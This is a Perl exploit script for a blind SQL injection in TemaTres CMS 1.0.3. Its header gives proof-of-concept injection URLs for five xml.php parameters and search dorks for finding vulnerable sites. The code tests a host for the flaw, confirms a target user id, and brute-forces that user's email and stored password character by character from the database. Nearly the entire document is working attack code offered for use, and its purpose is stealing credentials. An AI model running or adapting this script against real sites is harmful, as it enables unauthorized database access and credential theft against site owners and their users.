#!/usr/bin/perl
#---------------------------------------------------
#BLIND SQL INJECTION EXPLOIT--TemaTres 1.0.3-->
#---------------------------------------------------
#
#CMS INFORMATION:
#
#-->WEB: http://www.r020.com.ar/tematres/
#-->DOWNLOAD: http://sourceforge.net/projects/tematres/
#-->DEMO: http://www.r020.com.ar/tematres/index.php
#-->CATEGORY: CMS / Portals
#-->DESCRIPTION: Web application to manage controlled vocabularies, taxonomies and thesaurus...
#
#CMS VULNERABILITY:
#
#-->TESTED ON: firefox 3
#-->DORKs: "Powered by TemaTres" / "Generado por TemaTres" / "Criado por TemaTres"
#-->CATEGORY: BLIND SQL INJECTION EXPLOIT
#-->AFFECT VERSION: LAST = 1.0.3 (maybe <= ?)
#-->Discovered Bug date: 2009-04-24
#-->Reported Bug date: 2009-04-24
#-->Fixed bug date: 2009-05-04
#-->Info patch (v1.0.31): http://www.r020.com.ar/tematres/tematres1.031.zip
#-->Author: YEnH4ckEr
#-->mail: y3nh4ck3r[at]gmail[dot]com
#-->WEB/BLOG: N/A
#-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.
#-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!).
#
#------------
#CONDITIONS:
#------------
#
#**gpc_magic_quotes=off
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#~~~~~~-----> (get vars --> 'dcTema', 'madsTema', 'zthesTema', 'skosTema', 'xtmTema'):
#
#http://[HOST]/[HOME_PATH]/xml.php?dcTema=1'+AND+1=0/*
#http://[HOST]/[HOME_PATH]/xml.php?dcTema=1'+AND+1=1/*
#
#http://[HOST]/[HOME_PATH]/xml.php?madsTema=2'+and+1=1/*
#http://[HOST]/[HOME_PATH]/xml.php?madsTema=2'+and+1=0/*
#
#http://[HOST]/[HOME_PATH]/xml.php?zthesTema=2'+AND+1=0/*
#http://[HOST]/[HOME_PATH]/xml.php?zthesTema=2'+AND+1=1/*
#
#http://[HOST]/[HOME_PATH]/xml.php?skosTema=2'+AND+1=1/*
#http://[HOST]/[HOME_PATH]/xml.php?skosTema=2'+AND+1=0/*
#
#http://[HOST]/[HOME_PATH]/xml.php?xtmTema=2'+AND+1=0/*
#http://[HOST]/[HOME_PATH]/xml.php?xtmTema=2'+AND+1=1/*
#
#######################################################################
#######################################################################
##*******************************************************************##
##             ESPECIAL GREETZ TO: Str0ke, JosS, Ulises2k ...        ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##              GREETZ TO: SPANISH H4ck3Rs community!                ##
##*******************************************************************##
#######################################################################
#######################################################################
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = "";
	if (index(lc($SO),"win")!=-1){
		$linux="0";
	}else{
		$linux="1";
	}		
	if($linux){
		system("clear");
	}
	else{
		system("cls");
		system ("title TemaTres CMS v1.0.3 (BLIND SQL Injection) Exploit");
		system ("color 04");
	}
}
sub request {
	my $userag = LWP::UserAgent->new;
	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -> new(GET => $_[0]);
	my $outcode= $userag->request($request)->as_string;
	return $outcode;
}
sub helper {
	print "\n\t[###] TemaTres CMS v1.0.3 - (BLIND SQL Injection) Exploit\n";
	print "\t[###] USAGE MODE: [###]\n";
	print "\t[###] perl $0 [HOST] [PATH] [DBPREFIX] [Id]\n";
	print "\t[###] [HOST]: Web.\n";
	print "\t[###] [PATH]: Home Path.\n";
	print "\t[###] [DBPREFIX]: Database Prefix. Default: lc_ (**optional)\n";
	print "\t[###] [id]: Id user. Default: 1 (**optional)\n";
	print "\t[###] Example: perl $0 'www.example.es' 'tematres1.03' 'lc_' '1'\n";
}
sub lengthcolumns{
#First, user length...
$exit=0;
$i=0;
while($exit==0){
	my
$blindsql=$_[0]."1'+AND+(SELECT+length(".$_[3].")+FROM+".$_[2]."usuario+WHERE+id=".$_[1].")=".$i++."/*";
#injected code
	$output=&request($blindsql);
	if($output =~ (/\<dcterms\:created\>[0-9\-\:\s]+\<\/dcterms\:created>/)){
		$exit=1;
	}else{
		$exit=0;
	}
}
#Save column length
$length=$i-1;
print "\t<<<<<--------------------------------------------------------->>>>>\n";
print "\t".$_[3]." Length catched!\n";
print "\t".$_[3]." Length: ".$length."\n";
print "\tBruteforcing values...\n";
print "\t<<<<<--------------------------------------------------------->>>>>\n";
return $length;
}
sub bruteforcing {
my $values="";
#Getting datas
$j=1;
	$i=46;
	while(($j<=$_[2]) && ($i<=126)){
	
$blindsql=$_[0]."1'+AND+ascii(substring((SELECT+".$_[3]."+FROM+".$_[4]."usuario+WHERE+id='".$_[1]."'),".$j.",1))=".$i."/*";
#injected code
		my $output=&request($blindsql);
		if($output =~ (/\<dcterms\:created\>[0-9\-\:\s]+\<\/dcterms\:created>/)){
			$values=$values.chr($i);
			$j++;
			$i=45;
		}
		if($i==57)
		{
			$i=63; #@
		}
		if($i==64)
		{
			$i=96;
		}
#new char
	$i++;
	}
#Error
	if(($i>127) || ($j>$_[2])){
		if(!$values){
			print "\t<<<<<--------------------------------------------------------->>>>>\n";
			print "\tEXPLOIT FAILED!\n";
			print "\tFatal error: Datas doesn't find!\n";
			print "\tCause: Maybe you have to include more characters on bruteforcing...\n";
			print "\t<<<<<--------------------------------------------------------->>>>>\n";
			exit(1);
		}
	}
	
return $values;
}
#Main
&lw;
	print "\t\t#######################################################\n\n";
	print "\t\t#######################################################\n\n";
	print "\t\t##  TemaTres v1.0.3 - (BLIND SQL Injection) Exploit  ##\n\n";
	print "\t\t##     ++Conditions: Need magic_quotes=off           ##\n\n";
	print "\t\t##                 Author: Y3nh4ck3r                 ##\n\n";
	print "\t\t##          Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n";
	print "\t\t##                  Proud to be Spanish!             ##\n\n";
	print "\t\t#######################################################\n\n";
	print "\t\t#######################################################\n\n";
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];
#Build the uri
	my $finalhost="http://".$host."/".$path."/xml.php?dcTema=";
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs<=1)
	{
		&helper;
		exit(1);	
	}
#DB PREFIX parameter. It's optional. Default: lc_
	if(!$ARGV[2]){
		$db_prefix="lc_";	
	}else{
		$db_prefix=$ARGV[2];	
	}
#Id-user is optional.Default:1
	if(!$ARGV[3]){
		$idhacked="1";	
	}else{
		$idhacked=$ARGV[3];	
	}
#Testing blind sql injection
my $finalrequest = $finalhost;	
#Test blind sql injection
my $blindsql=$finalrequest."1'+AND+1=0/*"; #injected code
$output=&request($blindsql);
if ($output =~ (/\<dcterms\:created\>[0-9\-\:\s]+\<\/dcterms\:created>/))
{
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tThis Web is not vulnerable!\n";
	print "\t--->Maybe:\n";
	print "\t--->Patched or gpc_magic_quotes=off\n";
	print "\tEXPLOIT FAILED!\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	exit(1);
}else{
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tWeb is vulnerable!\n";
	print "\tTested Blind SQL Injection.\n";		
	print "\tChecking id user...\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";

}	
#Test if user exists
my
$blidsql=$finalrequest."1'+AND+(SELECT+COUNT(*)+FROM+".$db_prefix."usuario+WHERE+id='".$idhacked."')/*";
#injected code
$output=&request($blindsql);
if ($output =~ (/\<dcterms\:created\>[0-9\-\:\s]+\<\/dcterms\:created>/))
{
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tUser doesn't exists!\n";		
	print "\tEXPLOIT FAILED!\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	exit(1);
}else{

	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tOK...The user exists!\n";		
	print "\tStarting exploit...\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tWait several minutes...\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
}	
#Bruteforcing user...
$length_mail=&lengthcolumns($finalrequest,$idhacked,$db_prefix,'mail');
$length_pass=&lengthcolumns($finalrequest,$idhacked,$db_prefix,'pass');
$email=&bruteforcing($finalrequest,$idhacked,$length_mail,'mail',$db_prefix);
if(length($email)!=$length_mail)
{
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tEXPLOIT FAILED!\n";
	print "\tFatal error: Different length email!\n";
	print "\tCause: Maybe you have to include more characters on bruteforcing...\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	exit(1);
}

print "\t<<<<<--------------------------------------------------------->>>>>\n";
print "\tGot user!\n";
print "\tBruteforcing password (no hash!)...\n";
print "\t<<<<<--------------------------------------------------------->>>>>\n";
#Bruteforcing password...
$passnohash=&bruteforcing($finalrequest,$idhacked,$length_pass,'pass',$db_prefix); #it isn't needed
length
if(length($passnohash)!=$length_pass)
{
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	print "\tEXPLOIT FAILED!\n";
	print "\tFatal error: Different length pass!\n";
	print "\tCause: Maybe you have to include more characters on bruteforcing...\n";
	print "\t<<<<<--------------------------------------------------------->>>>>\n";
	exit(1);
}
print "\n\t\t*************************************************\n";
print "\t\t*** EXPLOIT EXECUTED (TemaTres v1.0.3 BSQLi) ****\n";
print "\t\t*************************************************\n\n";
print "\t\tUser-id:".$idhacked."\n";
print "\t\tE-mail:".$email."\n";
print "\t\tUser-password:".$passnohash."\n\n";
print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
print "\t\t<<------------------------EOF---------------------->>\n\n";
exit(1);
#Ok...all job done
